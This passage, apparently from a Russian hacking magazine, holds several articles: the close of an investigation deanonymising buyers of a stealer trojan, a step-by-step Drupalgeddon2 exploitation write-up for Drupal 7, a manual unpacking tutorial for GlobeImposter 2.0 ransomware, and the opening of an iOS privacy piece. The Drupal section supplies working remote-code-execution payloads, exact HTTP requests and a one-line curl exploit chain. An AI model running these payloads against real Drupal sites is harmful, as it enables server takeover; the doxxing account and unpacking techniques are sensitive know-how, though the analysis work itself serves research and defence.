и прочей выложенной в паблик информации ана литики очень быстро уста‐
новили несколько технических доменов, с которых он раз давал свой вре‐
доносный софт, и три используемых им личных адреса электронной почты.
На просторах интернета также был найден номер мобильного телефона
«Енота Погромиста», а к нему ока зался привязан аккаунт Telegram, который
он использует для обратной свя зи. Соб ранная воедино информация о сем‐
плах стилеров, видеоро ликах, доменах и адресах почтовых ящиков образова‐
ла вот такую схе му связей вирусо писа теля и задей ствованных им технических
средств.





Но самое забавное крылось в коде тро янов. Клиентам, которым «Енот» про‐
давал свои стилеры, предлагалось зарегистрировать аккаунт в облачном хра‐
нилище pCloud, куда троян самостоятельно заг ружал запакованные в архив
файлы с зараженного компьютера. При этом логин и пароль от каждого акка‐
унта своих клиентов «Енот Погромист» предус мотрительно зашил в тело
самих стилеров практичес ки в открытом виде, благодаря чему извлечь их
оттуда можно безо всякого тру да.
   Ну и сами покупатели троянов в боль шинстве сво ем отличались высочай‐
шим интеллектом, недюжинным умом и дьявольской сообразительностью:
многие из них запускали стилер на сво их личных машинах (вероятно, в тес‐
товых целях), благодаря чему их персональные файлы оказались залиты
в облачное хранилище, к которому стараниями «Енота» может получить дос‐
туп кто угодно. Не говоря уже о том, что некоторые особо одаренные гумано‐
иды использовали в качестве логина на pCloud свои личные адреса электрон‐
ной почты, привязанные к реальным страничкам в соци альных сетях. Да, и,
разумеется, пароль у них тоже везде одинаковый.


ЗАКЛЮЧЕНИЕ
Удивительно, сколько сведений о себе люди доб ровольно оставляют в Сети.
  Поскольку «Енот Погромист» любез но слил нам приватную информацию
о своих клиентах, было бы глупо не поин тересовать ся, чем они занимаются
в сво бодное от покупки троянов время. Ока залось, что многие из них поль‐
зуются и другими стилера ми, в изобилии продающимися на соответс твующих
форумах. От обнаруженных нами сведений потянулись ниточки к различным
сетевым ресурсам: одна за другой отыскивались личные странички в соц‐
сетях, каналы на YouTube, почтовые адреса, номера мобильных телефонов,
идентификаторы электронных кошельков в платежных сис темах... Некоторые
клиенты «Енота» владеют веб‐сайтами — благодаря службе Whois удалось
выяснить имена администра торов используемых ими доменов. У одного
«грозного хакера» ко всему прочему обна ружился электронный дневник,
которыми сейчас поль зуются все школь ники.
   Таким образом, все покупа тели Ено товых стилеров были нами в кратчай‐
шие сроки вычислены, деанонимизированы, на каждого составлено под‐
робное досье и сло жено в аккуратненькую папочку. Еноты иногда бывают
крайне полезны в деле борьбы с киберпреступностью.
  В общем, друзья, для того чтобы вычислить автора вирусов, иногда дос‐
таточно простой внимательности к мелочам — бла годаря этому порой уда‐
ется провести боль шое и успешное расследование.
ВЗЛОМ



 ПРЕДПОСЛЕДНЯЯ
    КАПЛЯ
                       РАЗБИРАЕМ
                     УЯЗВИМОСТЬ
                   DRUPALGEDDON2
                       В DRUPAL 7





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





Недавно мир узнал о серьезной уязвимости в системе
управления контентом Drupal — мы тогда подробно писали
об этом. Однако, разобрав проблему в ветке 8.x, мы оста‐
вили за кадром аналогичную брешь в Drupal 7. А ведь на этой
версии сейчас работа ет куда больше сай тов! Эксплуати‐
ровать уязвимость в ней сложнее, но не намного. Сейчас я
покажу, как это делается.


ПОДГОТОВКА
Для демонстрации уязвимос ти проще всего использовать офи циальный
репозиторий Drupal на Docker Hub. Разворачиваем контейнер с нужной вер‐
сией CMS. Сначала поднимаем сервер БД.


$ docker run ‐d ‐e MYSQL_USER="drupal" ‐e MYSQL_PASSWORD="7C4TYV
ARsy" ‐e MYSQL_DATABASE="drupal" ‐‐rm ‐‐name=mysql ‐‐hostname=mysql
mysql/mysql‐server

Теперь дело за контейнером с CMS. В этот раз берем самую старую уяз‐
вимую версию — 7.57.


$ docker run ‐d ‐‐rm ‐p80:80 ‐p9000:9000 ‐‐link=mysql
‐‐name=drupalvh ‐‐hostname=drupalvh drupal:7.57

Теперь через веб‐интерфейс устанавлива ем Drupal и проверяем, все ли у нас
работает.





                        Ус тановка Drupal 7.57

Еще неплохо было бы завес ти отладчик. Для этого я допол нительно установ‐
лю расширение Xdebug.


$ pecl install xdebug
$ echo "zend_extension=/usr/local/lib/php/extensions/
no‐debug‐non‐zts‐20151012/xdebug.so" > /usr/local/etc/php/conf.d/
php‐xdebug.ini
$ echo "xdebug.remote_enable=1" >> /usr/local/etc/php/conf.d/
php‐xdebug.ini
$ echo "xdebug.remote_host=192.168.99.1" >> /usr/local/etc/php/conf.
d/php‐xdebug.ini
$ service apache2 reload

Не забудь поменять IP‐адрес 192.168.99.1 на свой и обрати внимание на путь
до скомпиленной библиотеки xdebug.so. Пос ле перезагрузки конфигов
Apache можешь запускать свой любимый дебаггер. В работе я по‐прежнему
использую PhpStorm и расширение Xdebug helper для Chrome.
   Теперь скачиваем исходники CMS, слушаем 9000‐й порт — и вперед,
к победам.


ПЕРВЫЕ ШАГИ
Перейдем на страницу создания нового акка унта. В седьмой версии она зна‐
чительно аскетичнее, чем в восьмой.





                Создание нового акка унта в Drupal 7





                Создание нового акка унта в Drupal 8

Из‐за того, что отсутству ет возможность заг рузить аватар, стандартный век‐
тор эксплуатации тут не сра ботает. Значит, нуж но найти новый! Суть бага все
та же — это внедрение элементов в Renderable Arrays, которые будут обра‐
ботаны с помощью Render API. Существу ют специальные элементы, которые
вызывают функцию call_user_func с кастомными параметрами.
  Для начала посмотрим, как обра баты ваются роуты в приложе нии. Если
у тебя на сервере включены семантические URL, то URI перенаправляются
на файл index.php как GET‐параметр q.


/index.php
19: require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
20: drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
21: menu_execute_active_handler();


/includes/menu.inc
510: function menu_execute_active_handler($path = NULL, $deliver =
TRUE) {
...
521:   if ($page_callback_result == MENU_SITE_ONLINE) {
522:     if ($router_item = menu_get_item($path)) {

Например, для отображения стра ницы http://drupal.vh/user/register
будет выполнен запрос http://drupal.vh/index.php?q=user/register.





                 Об работ ка роутов в Drupal 7


/includes/menu.inc
455: function menu_get_item($path = NULL, $router_item = NULL) {
456:   $router_items = &drupal_static(__FUNCTION__);
457:   if (!isset($path)) {
458:     $path = $_GET['q'];
459:   }
460:   if (isset($router_item)) {
461:     $router_items[$path] = $router_item;
462:   }

Далее путь разбивается при помощи функции array_slice и выпол няется
запрос к базе данных для выборки путей из таб лицы с роутами. По умолчанию
menu_router.


473:     $parts = array_slice($original_map, 0, MENU_MAX_PARTS);
474:     $ancestors = menu_get_ancestors($parts);
475:     $router_item = db_query_range('SELECT * FROM {menu_router}
WHERE path IN (:ancestors) ORDER BY fit DESC', 0, 1, array(':ancest
ors' => $ancestors))‐>fetchAssoc();

В таблице хранятся колбэки, которые нужно выполнять при обращении
к соответствующим путям.





     Таблица с информацией о существующих роутах и их параметрах

Если путь и соответствующий ему колбэк найден, то он вызывается через
функцию call_user_func_array.


510: function menu_execute_active_handler($path = NULL, $deliver =
TRUE) {
...
518:   drupal_alter('menu_site_status', $page_callback_result, $
read_only_path);
...
519:
520:   // Only continue if the site status is not set
521:   if ($page_callback_result == MENU_SITE_ONLINE) {
522:     if ($router_item = menu_get_item($path)) {
523:       if ($router_item['access']) {
...
527:         $page_callback_result = call_user_func_array($router
_item['page_callback'], $router_item['page_arguments']);

Как ты, возможно, знаешь из моего разбора уяз вимости в Drupal 8, существу‐
ет метод uploadAjaxCallback. Он давал воз можность выполнять рендеринг
вложенного массива с пользовательскими данными. Так вот, в седьмой вер‐
сии есть похожая функция — file_ajax_upload. Она тоже отве чает за обра‐
ботку файлов, загруженных с помощью AJAX‐запросов, и в ней есть место,
где массив с нужными данными отправляется на рендеринг.


/modules/file/file.module
238: function file_ajax_upload() {
239:   $form_parents = func_get_args();
240:   $form_build_id = (string) array_pop($form_parents);
241:
242:   if (empty($_POST['form_build_id']) || $form_build_id != $_POST
['form_build_id']) {
...
250:   list($form, $form_state, $form_id, $form_build_id, $commands)
= ajax_get_form();
...
268:   drupal_process_form($form['#form_id'], $form, $form_state);
...
285:   $output = drupal_render($form);

Теперь посмотрим, запросы к каким путям используют эту функцию в качес‐
тве кол бэка.


mysql> select path,page_callback from menu_router where page_callback
='file_ajax_upload';


+‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
| path      | page_callback    |
+‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
| file/ajax | file_ajax_upload |
+‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
1 row in set (0.00 sec)

Попробуем сделать его вызов, наб рав http://drupal.vh/file/ajax/test/
test.





                  От ладка зап роса к роуту ﬁle/ajax

Валидный запрос имеет вид http://drupal.vh/file/ajax/имя_элемента/
ключ/id_формы, где имя элемента и ключ — это путь до мас сива, который
нужно отрендерить. В запросе также должен указываться параметр for‐
m_build_id, который соот ветствует id обра баты ваемой формы.


242:   if (empty($_POST['form_build_id']) || $form_build_id != $_POST
['form_build_id']) {

Сама форма извле кается из кеша с помощью функции ajax_get_form. AJAX
подразуме вает фоновое выполнение и отправку запросов с уже загруженной
браузером страницы. При обра ботке с помощью ajax_get_form Drupal счи‐
тает, что в кеше уже должна находиться форма, для которой происходит
изменение или обновление содержимого. Если это не так, то скрипт прос то
остановит работу.


250:   list($form, $form_state, $form_id, $form_build_id, $commands)
= ajax_get_form();


/includes/ajax.inc
322: function ajax_get_form() {
...
323:   $form_state = form_state_defaults();
324:
325:   $form_build_id = $_POST['form_build_id'];
...
328:   $form = form_get_cache($form_build_id, $form_state);
329:   if (!$form) {
...
335:     watchdog('ajax', 'Invalid form POST data.', array(), WATCHD
OG_WARNING);
336:     drupal_exit();
337:   }

Наша задача — записать в кеш форму с пейлоадом, а потом с помощью зап‐
роса к file/ajax вызвать рендеринг этой формы.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

    ПРЕДПОСЛЕДНЯЯ
             КАПЛЯ
          РАЗБИРАЕМ УЯЗВИМОСТЬ DRUPALGEDDON2
                                 В DRUPAL 7





МАНИПУЛЯЦИИ С КЕШЕМ
Итак, посмотрим на любую форму, дос тупную без авторизации, — например,
сброс пароля пользователя. Она хороша тем, что позволя ет записывать про‐
извольные пользовательские данные в параметр #default_value.


/modules/user/user.pages.inc
30: function user_pass() {
31:   global $user;
32:
33:   $form['name'] = array(
34:     '#type' => 'textfield',
35:     '#title' => t('Username or e‐mail address'),
36:     '#size' => 60,
37:     '#maxlength' => max(USERNAME_MAX_LENGTH, EMAIL_MAX_LENGTH),
38:     '#required' => TRUE,
39:     '#default_value' => isset($_GET['name']) ? $_GET['name'] : ''
,
40:   );
...
60:   return $form;





             Запрос к форме сброса пароля пользовате ля

С помощью этой формы мы можем передать RCE‐пейлоад типа такого:


#post_render[]=exec&#children=ls

Но вот беда: при передаче невалидных данных в качес тве имени форма
не кешируется. Полистав код, обнаруживаем, что метод form_set_cache
записывает информацию об указанной форме в кеш.


/includes/form.inc
557: function form_set_cache($form_build_id, $form, $form_state) {
558:   // 6 hours cache life time for forms should be plenty.
559:   $expire = 21600;
...
571:   if (isset($form)) {
...
576:     cache_set('form_' . $form_build_id, $form, 'cache_form',
REQUEST_TIME + $expire);
577:   }

Вызов этого метода происходит в drupal_rebuild_form.


464: function drupal_rebuild_form($form_id, &$form_state, $old_form =
 NULL) {
465:   $form = drupal_retrieve_form($form_id, $form_state);
...
502:   if (empty($form_state['no_cache'])) {
503:     form_set_cache($form['#build_id'], $form, $form_state);
504:   }

Эта функция вызывается из drupal_process_form, которая используется
при обработке любой формы.


865: function drupal_process_form($form_id, &$form, &$form_state) {

В ней же имеются и условия, при соблюдении которых форма попадает в кеш.


969:     if (($form_state['rebuild'] || !$form_state['executed']) &&
!form_get_errors()) {
970:       // Form building functions (e. g., _form_builder_h
andle_input_element())
971:       // may use $form_state['rebuild'] to determine if they
are running in the
972:       // context of a rebuild, so ensure it is set
973:       $form_state['rebuild'] = TRUE;
974:       $form = drupal_rebuild_form($form_id, $form_state, $form);
975:     }

Первая часть условия ($form_state['rebuild'] || !$form_state['exe‐
cuted']) почти на любой дефолтной форме будет TRUE, а вот с for‐
m_get_errors есть проб лемы. Эта функция про веря ет, валидны ли введен‐
ные в форму данные.


1676: function form_get_errors() {
1677:   $form = form_set_error();
1678:   if (!empty($form)) {
1679:     return $form;
1680:   }
1681: }

Наши, к сожалению, никаких про верок не выдержива ют, и мы ловим ошибку
вида Username or e‐mail address field is required.





         Валидатор введенных в форму данных вернул ошибку

Посмотрим поближе на функцию form_set_error.


1623: function form_set_error($name = NULL, $message = '', $limit_
validation_errors = NULL) {
1624:   $form = &drupal_static(__FUNCTION__, array());
1625:   $sections = &drupal_static(__FUNCTION__ . ':limit_validatio
n_errors');
...
1630:   if (isset($name) && !isset($form[$name])) {
1631:     $record = TRUE;
1632:     if (isset($sections)) {
...
1640:       $record = FALSE;
...
1654:     }
1655:     if ($record) {
1656:       $form[$name] = $message;
1657:       if ($message) {
1658:         drupal_set_message($message, 'error');
1659:       }
1660:     }

Обрати внимание на переменную $record: если она установлена в FALSE, то
сообщение об ошибке не будет выводить ся. Зна чение FALSE она принимает,
когда $sections — не null.


1626:   if (isset($limit_validation_errors)) {
1627:     $sections = $limit_validation_errors;
1628:   }

Еще немного побегав по файлу form.inc, натыкаемся на такой кусок:


1412:     if (isset($form_state['triggering_element']['#limit_
validation_errors']) && ($form_state['triggering_element']['#limit_
validation_errors'] !== FALSE) && !($form_state['submitted'] && !
isset($form_state['triggering_element']['#submit']))) {
1413:       form_set_error(NULL, '', $form_state['triggering_element'
]['#limit_validation_errors']);
1414:     }
...
1423:     elseif (isset($form_state['triggering_element']) && !isset(
$form_state['triggering_element']['#limit_validation_errors']) && !$
form_state['submitted']) {
1424:       form_set_error(NULL, '', array());
1425:     }
...
1430:     else {
1431:       drupal_static_reset('form_set_error:limit_validatio
n_errors');
1432:     }

Во время обработки нашего POST‐запроса мы попадаем в последнюю ветку
условия, но если удастся попасть во вторую, то сообщения об ошибке
не будет. Потому что в качес тве третьего аргумента функции form_set_error
($limit_validation_errors) отправляется пустой мас сив, который впос‐
ледствии станет переменной $sections.
   Разберем нужное нам усло вие по частям.
 • isset($form_state['triggering_element'])  воз вращает  true.
  Ключ triggering_element указывает на элемент, который вызвал обработку
  формы. В нашем случае это кнопка E‐mail new password.
 • !isset($form_state['triggering_element']['#limit_valida
  tion_errors']) воз вра щает false. Этот ключ указывает, ограничивать
   вывод ошибок валида ции или нет. По дефолту не ограничено, поэтому
   ключ limit_validation_errors будет содержать false.
 • !$form_state['submitted'] также воз вра щает false. Так как форма
   отправлена, ключ submitted уста новлен в true.





  Отладка запроса на сброс пароля. Усло вия, нужные для сокрытия оши ‐
  бок валидации

Посмотрим, в каком месте изменяется зна чение клю ча submitted перемен‐
ной $form_state.


1987:     if (!empty($form_state['triggering_element']['#execut
es_submit_callback'])) {
1988:       $form_state['submitted'] = TRUE;
1989:     }

Откуда вообще берется этот triggering_element? Если он не указан явно,
то элементом считается первая нажатая кнопка в форме.


2142:   if ($process_input) {
...
2144:     if (_form_element_triggered_scripted_submission($element, $
form_state)) {
2145:       $form_state['triggering_element'] = $element;
2146:     }
...
2151:     if (isset($element['#button_type'])) {
...
2155:       $form_state['buttons'][] = $element;
2156:       if (_form_button_was_clicked($element, $form_state)) {
2157:         $form_state['triggering_element'] = $element;
2158:       }
2159:     }
2160:   }

Заглянем в функцию _form_element_triggered_scripted_submission.


2180: function _form_element_triggered_scripted_submission($element,
&$form_state) {
2181:   if (!empty($form_state['input']['_triggering_element_name'])
&& $element['#name'] == $form_state['input']['_triggering_ele
ment_name']) {
2182:     if (empty($form_state['input']['_triggering_element_value']
) || $form_state['input']['_triggering_element_value'] == $element['#
value']) {
2183:       return TRUE;
2184:     }
2185:   }
2186:   return FALSE;
2187: }

Этот код выполняет про верку, равны ли $form_state['input']['_trigger‐
ing_element_name'] и $element['#name']. Массив $form_state['input']
содержит все переданные в форме параметры. Таким образом, отправив
_triggering_element_name с именем нужного элемента, можно вручную
обозначить его элементом, спровоцировавшим отправку формы. Попробуем
это сделать. Укажем в качестве _triggering_element_name имя текс тбокса
из нашей формы сброса пароля, а оригинальный сабмит (параметр op)
передавать не будем, иначе он перезапишет кас томный triggering_ele‐
ment.





  Назначение triggering_element с помощью параметра
  _triggering_element_name

Действительно, после такого финта мы име ем в $form_state['trigger‐
ing_element'] наш текс тбокс.





               Успешно переназначили triggering_element

Помимо того что этот элемент не имеет параметра #executes_submit_call‐
back, в нем также отсутству ет #limit_validation_errors, а это значит, что
мы убили сразу двух зайцев и теперь условие на отключение ошибок валида‐
ции отрабатывает успешно.





           Успешный обход вывода ошибок валида ции формы

Теперь эта форма попадает в кеш, то есть в таблицу cache_form базы дан‐
ных.





                    Форма попала в кеш

Идентификатор фор мы возвращает ся в ответе сервера в виде скрытого поля
form_build_id.


ЭКСПЛОИТ
Собираем всю полученную информацию вмес те. Экс плуатация производится
в два запроса. Сначала отправляем форму с нужным пей лоадом в кеш,
а затем вторым запросом к ﬁle/ajax дергаем ее отту да и триггерим уяз‐
вимость.
  Первый запрос будет выглядеть так:


POST /user/password?name[%23post_render][]=passthru&name[%23children]
=ls HTTP/1.1
Host: drupal.vh
Content‐Type: application/x‐www‐form‐urlencoded
_triggering_element_name=name&form_id=user_pass

Обрати внимание, что значение (default_value) для параметра name берет‐
ся из массива $_GET, поэто му запрос выглядит именно так.


/modules/user/user.pages.inc
30: function user_pass() {
...
39:     '#default_value' => isset($_GET['name']) ? $_GET['name'] : ''
,

Смотрим ID, который вернула система, и подставляем его во второй запрос.


POST /file/ajax/name/%23default_value/form‐c2ards5ANmsD9HGEq4986Ruf
9gmuDyAr3Fu7d4t75Lg HTTP/1.1
Host: drupal.vh
Content‐Type: application/x‐www‐form‐urlencoded
form_build_id=form‐c2ards5ANmsD9HGEq4986Ruf9gmuDyAr3Fu7d4t75Lg





                   Ус пешная эксплуата ция Drupal 7

Выкидываем лишнее и объединяем все в одну команду.


$ curl ‐s ‐‐globof "http://drupal.vh/user/password?name[%23post
_render][]=passthru&name[%23children]=ls" ‐‐data "_triggering_ele
ment_name=name&form_id=user_pass"|grep form_build_id|awk ‐F'"' '{
print $6}'|xargs ‐I^ curl ‐s "http://drupal.vh/file/ajax/name/%23defa
ult_value/^" ‐‐data "form_build_id=^"

Вот так в одну строч ку можно проэкс плу атировать уязвимость в Drupal 7. Воз‐
можно, ты найдешь способ сделать это еще элегантнее.





               Эксплуата ция для Drupal 7 с помощью curl

Разумеется, существуют уже готовые инстру менты для автоматической экс‐
плуатации этой уязвимос ти. Если интерес но, то рекомендую обратить вни‐
мание на репозиторий github.com/dreadlocked/Drupalgeddon2.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Ну что тут можно сказать? Зло умышленники не дремлют, число атак постоян‐
но растет, и по Сети уже рыщут самые разные сканеры в надежде превратить
любой попавшийся под руку уяз вимый сервер в майнер криптовалюты, сде‐
лать его частью ботнета или отправной точкой для сотни других возможных
темных делишек. Так что бегом обновляться, если у тебя где‐то установлен
Drupal не последней версии.
ВЗЛОМ





       Nik Zerof
   xtahi0nix@gmail.com

       РУЧНАЯ
   РАСПАКОВКА

        ВСКРЫВАЕМ КАСТОМНЫЙ ПАКЕР
             НА ПРИМЕРЕ ВЫМОГАТЕЛЯ
                   GLOBEIMPOSTER 2.0




При реверсе вирусов зачастую обна руживается, что малварь
накрыта какой‐нибудь «навесной» защитой вроде пакера
или протектора. Причем часто используется не общедос‐
тупный вариант, а  кастомный упа ковщик,  что серьезно
усложняет дело. Я покажу, как быть в такой ситуации, на при‐
мере распаковки рансомвари GlobeImposter 2.0, пронес‐
шейся в конце прошлого года.


Строго говоря, пакер — это прог рамма, которая упа ковы вает файлы, то есть
уменьшает их размер. В свою очередь, протекторы заточены под создание
сложностей в реверсе программы: они могут препятствовать сня тию дампа,
встраивать в программы антиотладочные приемы, функции определе ния
работы внутри виртуальных машин и в целом вся чес ки затруднять вос станов‐
ление оригинального потока управления в приложении.
  Надо сказать, что использование пакеров и про текторов не всегда сви‐
детельствует о том, что перед нами вирус или другое вредонос ное ПО:
навесные защиты исполь зуют вполне легитимные программы для того, чтобы
защитить свои алго ритмы от любопытных глаз реверсеров или спрятать
механизмы регистрации, затруднив соз дание кряка или кейгена.


ПЕРВЫЙ ВЗГЛЯД НА GLOBEIMPOSTER
В конце 2017 года антивирус ные сети зафиксирова ли распространение бот‐
нетом Necurs новой версии GlobeImposter — шифровальщика, требующе го
выкуп за зашифрованные им файлы. Обра зец это го вредоносного ПО нес‐
колько отличается от остальных, и он сам немного поможет нам его
победить. Как именно, рас ска жу даль ше, а сейчас просто загрузим семпл
в дизассемблер IDA.





             Нерас пакованный обра зец GlobeImposter


           WARNING

                     Все описан ные в статье действия выполнялись
                         внутри виртуальной машины, которая была изо‐
                      лирована от Сети. Если повторять их на основном
                      компьютере,  вирус‐вымогатель  GlobeImposter
                     может заразить его и зашифровать твои данные.


Мы видим, что кода совсем мало, — IDA не разобрала львиную долю файла.
Это похоже на какую‐то упа ковку, поэто му смотрим, что нам покажет Detect It
Easy — популярный детектор пакеров и протекторов.





                            Анализ DIE





                         Энтро пия

DIE не показывает нам ничего, параметры энтропии и секции тоже как будто
в норме. Теперь загрузим наш семпл в программу pestudio, она дает много
информации о структуре файла и проверяет обра зец на VirusTotal.





          Нераспакованный обра зец GlobeImposter в pestudio

Разумеется, VirusTotal дает мас су сра батываний, так как перед нами извес‐
тный образец малвари. Но вирус ные индикато ры не приносят нам практичес‐
ки никакой интересной информа ции, раз ве что сообщают о некоторых подоз‐
рительных WinAPI. В любом случае мы понимаем, что наш семпл упакован
и нам его придется распаковывать. Для дальнейшей работы с образцом нуж‐
но вклю чать виртуальную машину и загружать вирус в отладчик. Мы будем
пользоваться отладчиком x64dbg, точнее его тридцатид вухбитной версией.





          Не распакованный обра зец GlobeImposter в x32dbg


Приступаем к распаковке
Итак, семпл загружен в отладчик, и перед нами некоторое количес тво
вызовов и переходов. Переключа емся в представление кода в виде графа,
нажав горячую клавишу G. Визуальное представление кода изменилось,
и стало немного проще. Как это всег да бывает при распаковке, нам нужно
найти OEP (Original Entry Point — оригинальная точка входа), чтобы, встав
на нее, снять дамп с про цес са. Если опус титься на пару экранов вниз, можно
увидеть код, напоминающий работу с базовым адресом загрузки модуля.
Конструкция стандартная и прос тая, переда ча параметров через стек и вызов
функции.





Давай попробуем установить точку останова на адрес 00403F30, по которому
находится вызов call, и запустим программу.


             INFO

                     На самом деле сразу же ставить точку останова
                      и пропускать весь остальной код весьма смело —
                      там может быть любой деструк тивный пейлоад,
                      который срабатывает при отладке или детектит
                      виртуальную машину. Но мы работаем в изолиро‐
                       ван ной среде и можем позволить себе легкое
                       безрассудство, ведь всегда можно  откатиться
                       на сделанный заранее снимок состояния ВМ.


Сработала точка останова, и мы погружа емся в вызов call  ransom_‐
glob_sample.401100, чтобы пос мотреть, что там происходит.




Мы видим стандартный пролог функции. Давай вызовем контекс тное меню
и проверим это место на наличие пролога. Кликай левой кнопкой инструкции
push ebp и выбирай «Анализ → Добавить функцию», либо можешь нажать
Shift + F.
   Теперь, когда мы внутри этой функции, давай немного огля димся. Сразу
бросается в глаза блок кода, который напоми нает работу с HTTP‐соединени‐
ями, но обрати внимание: параметры, которые передаются в функции WinAPI,
нулевые.





Очевидно, что этот код нам не интересен, потому что при передаче нулевых
значений в качестве параметров он не будет работать. Например, для кор‐
ректной работы функции WinHttpConnect необ ходимо передать валидный
хендл от вызова WinHttpOpen, а также сервер и порт. Вот ее прототип.


HINTERNET WINAPI WinHttpConnect(
_In_       HINTERNET     hSession,
_In_       LPCWSTR       pswzServerName,
_In_       INTERNET_PORT nServerPort,
_Reserved_ DWORD         dwReserved
);

Если эти значения переданы не будут, функция вернет NULL и больше ничего
не сделает. Как видишь в ASM‐листинге, в функцию передаются нули. Скажу
больше: если установить точку оста нова где угодно внутри этого кодового
блока, она не сработает, потому что код не получит управле ние. Во всяком
случае, так происходит при первом запуске этого вируса на незараженной
системе, а это значит, что наш код никако го отношения к распаковке семпла
не имеет. Смотрим еще.
   Чуть дальше в открытой нами функции наталкиваемся на такой очень инте‐
ресный кодовый блок.





            Динамичес кое получение WinAPI VirtualProtect

Здесь в память кладутся зна чения, которые представляют собой ASCII‐пред‐
ставление записи "VirtualProtect", а дальше идет вызов GetProcAddress.
Если мы поставим точку останова сра зу после GetProcAddress, по адресу
00401548, и запустим программу, то увидим, как функция  VirtualProtect
«соберется».





Разумеется, это динамичес кое получение адреса функции WinAPI Virtual‐
Protect. И это уже имеет непос редственное значение для распаковки!


             INFO

                      Код распаковывает ся в какой‐либо регион памяти
                      и уже в распакованном виде выполняется оттуда.
                    Но для это го нужно выделить память и изменить
                       атрибуты  доступа  к  ней,  чтобы  иметь  воз‐
                      можность выполнять  код. Функция Virtual‐
                   Protect как раз изме няет атрибуты доступа
                          к региону памяти, поэтому она меня так заин‐
                       тересовала.


Изучим эту функцию чуть подробнее. Вот ее прототип.


BOOL WINAPI VirtualProtect(
_In_  LPVOID lpAddress,
_In_  SIZE_T dwSize,
_In_  DWORD  flNewProtect,
_Out_ PDWORD lpflOldProtect
);

Нас интересует третий параметр этой функции — flNewProtect. Он как раз
устанавливает тип доступа к региону памяти. Давай посмотрим на стек, чтобы
узнать, какое значение туда переда ется.





               Парамет ры VirtualProtect в окне дампа

Видим, что передается зна чение 0x40, а документация MSDN показывает
нам, что это права на чтение, запись и выполнение. Мы получили немного
больше информации о том, как выглядит интересный нам регион памяти,
теперь самое время прыгнуть в него. Прыжок про исходит сразу после вызова
VirtualProtect.




После прыжка мы опять видим стандартный пролог функции, так что снова
жмем «Анализ → Добавить функцию». После про лога есть несколько вызовов
call, а потом идет не совсем обычный код. Это однозначно не распакован‐
ный PE‐файл, а скорее похоже на какой‐то базонезависимый код вроде
шелл‐кода.





И такого кода много. Чтобы понять, как он работает, давай трас сировать эту
функцию по одной инструкции, пока не дой дем до первого вызова call, пос‐
ле чего нырнем в него. После стандартного пролога нас ждет интерес ный
код, который часто встречается в разных зловредах, — это генерация строки
в памяти.





Давай выполним этот код до адреса 005DFA52 и посмотрим на дамп, начиная
с адреса в ebp‐28.



Это надпись kernel32.dll в двухбай товой кодировке, о чем говорят нули
(точки) между символами. Если мы потрассируем еще немного, то убедимся,
что смысл этого кода (всего вызова call, в который мы нырнули) — динами‐
ческое получе ние адресов функций LoadLibrary/GetProcAddress.
   Итак, выполним вызов до инструкции ret и сделаем один шаг, чтобы ока‐
заться на том месте, из которого мы пришли. Теперь наш странный код «вро‐
де шелл‐кода» становит ся понятным: это опять динамическое получение
адресов функций WinAPI.
   Если ставить точ ку останова на каждый push  eax и запус кать код
на исполнение, мы увидим, что получаются адреса для таких функций,
как VirtualFree, GetVersionExA, TerminateProcess, и дру гих. Давай перек‐
лючимся в представление кода в виде гра фа и прокрутим вниз — где‐то дол‐
жен быть переход в другой регион памяти.
  Помнишь, в начале статьи я говорил, что этот семпл вируса поможет нам
его распаковать? :‐) Если в конце графа найдешь прыжок на распакованный
код, чуть выше увидишь такой код.





Вызов call 80F98C — не что иное, как OutputDebugStringA с аргументом
"Jump  OEP"! По  всей видимости,  авторы  вируса забыли  отладочную
информацию, которая любез но сообщает нам о том, что сейчас будет прыжок
в OEP.
   Если мы поставим точку останова на jmp eax, а потом сделаем еще один
шаг отладчиком, то мы ока жемся на OEP нашего вируса. Потом нужно будет
реконструировать IAT плагином Scylla, который пос тавляется вместе с x64dbg
(нажав на кнопочку IAT Autosearch), и снять дамп кнопкой Dump. Пос ле заг‐
рузки дампа в IDA мы видим совершенно другую картину, которая говорит
нам о том, что файл распакован и IDA смогла его про анализировать.





                 Рас пакованный GlobeImposter в IDA

Готово!
ПРИВАТНОСТЬ
  ПРОСТО   ПРОСТО
   БИЗНЕС   БИЗНЕС





                                         Олег Афонин
                                            Эксперт по мобильной
                                          криминалистике компании
                                               «Элкомсофт»
                                               aoleg@voicecallcentral.com





     КАК APPLE ЗАЩИЩАЕТ ДАННЫЕ
       СВОИХ ПОЛЬЗОВАТЕЛЕЙ,
        ПРЕПЯТСТВУЯ РАБОТЕ
    ПРАВООХРАНИТЕЛЬНЫХ ОРГАНОВ




Из актуальных мобильных систем iOS на сегодня самая
безопасная с огромным отрывом. За последние несколько
лет Apple прев ратила свою сис тему в неприступный бастион,
новости о воз можных брешах в котором становятся сен‐
сацией. Но в последних версиях iOS стала не просто
безопасной, а очень удобной для зло умышленников: Apple
все чаще и чаще встраивает в систему средства защиты
именно от полиции, а не от воришек.


Если подклю чить iPhone с неизвес тным паролем к новому компьютеру, с него
невозможно будет скачать даже фотографии (для того же самого в смартфо‐
не с Android, что называ ется, есть варианты — от датчика отпе чатков до раз‐
блокирования через Smart Lock).
  Фотографии, конеч но, важны, но они даже не верхушка айсберга. В сов‐
ременном смартфоне хра нятся пароли к веб‐сай там, включая банковские,
и социальным сетям, данные приложений, чаты, история перепис ки, поис‐
ковых запросов и многое другое. Чем интенсивнее мы пользуемся смартфо‐
нами, тем больше информации в них накаплива ется и тем серьезнее про‐
изводители подходят к ее защите.
  Не стоит на месте и iOS. С каждой ее новой версией раз работчики Apple
предпринимают все воз можные шаги для усиления защиты данных — твоей
защиты и твоих данных. Но не зашла ли компания слишком далеко? Несколь‐
ко последних решений уберегут тебя исключительно от инте реса со стороны
правоохранительных орга нов, работа ющих с раз решения и одоб рения суда.
Давай посмотрим, что это за решения и могут ли они обе зопасить тебя
от действий злоумышленников, а не полиции.


